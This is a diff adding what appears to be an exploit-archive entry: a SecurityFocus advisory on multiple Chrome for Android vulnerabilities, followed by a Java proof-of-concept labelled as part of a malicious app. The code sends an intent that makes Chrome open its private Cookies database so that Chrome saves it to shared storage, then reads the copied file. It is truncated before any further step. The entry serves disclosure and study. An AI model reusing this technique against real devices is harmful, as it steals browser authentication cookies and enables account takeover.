@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/55523/info
+ 
+Google Chrome for Android is prone to multiple vulnerabilities.
+ 
+Attackers may exploit these issues to execute arbitrary code in the context of the browser, obtain potentially sensitive information, bypass the same-origin policy, and steal cookie-based authentication credentials; other attacks are also possible.
+ 
+Versions prior to Chrome for Android 18.0.1025308 are vulnerable. 
+
+// This is a part of malicious Android app.
+  public void attack() {
+    try {
+      // let Chrome app load its Cookies file, so that Chrome app
+      // automatically save it to /sdcard/Download/ directory.
+      Intent intent = new Intent("android.intent.action.VIEW");
+      intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");
+      intent.setData(Uri.parse("file:///data/data/com.android.chrome/app_chrome/Default/Cookies"));
+      startActivity(intent);
+  
+      // wait a few seconds
+      Thread.sleep(3000);
+  
+      // read the Cookie file (/sdcard/Download/Cookies.bin)
+      FileInputStream fis = new FileInputStream("/sdcard/Download/Cookies.bin");
+      ...
+  }
